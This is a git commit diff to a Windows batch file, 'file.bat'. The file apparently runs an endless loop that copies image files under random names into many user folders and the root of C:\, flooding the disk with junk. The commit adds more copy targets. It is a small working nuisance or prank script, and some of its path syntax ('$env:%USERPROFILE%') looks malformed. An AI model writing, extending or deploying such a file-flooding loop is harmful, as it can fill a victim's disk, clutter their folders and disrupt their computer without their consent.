5e3734def3c8c246751ef5dd4c3f1b0b802b6b8f
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 01:46:42 +0000

    Update file.bat

--- file.bat
+++ file.bat
@@ -3,5 +3,11 @@
 powershell cp %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%1.png
 powershell cp %TEMP%\image2.jpg $env:%USERPROFILE%\Documents\%random%3.jpg
 powershell cp %TEMP%\image3.jpg $env:%USERPROFILE%\Downloads\%random%2.jpg
-powershell cp %TEMP%\image.png $env:%USERPROFILE%\Pictures\%random%1.png
+powershell cp %TEMP%\image.png $env:%USERPROFILE%\Videos\%random%1.png
+powershell cp %TEMP%\image1.png $env:%USERPROFILE%\%random%1.png
+powershell cp %TEMP%\image.png C:\%random%1.png
+powershell cp %TEMP%\image3.png C:\%random%1.png
+powershell cp %TEMP%\image2.png C:\%random%1.png
+powershell cp %TEMP%\image3.png C:\Users\%random%1.png
+powershell cp %TEMP%\image2.png %TEMP%\%random%1.png
 goto loop
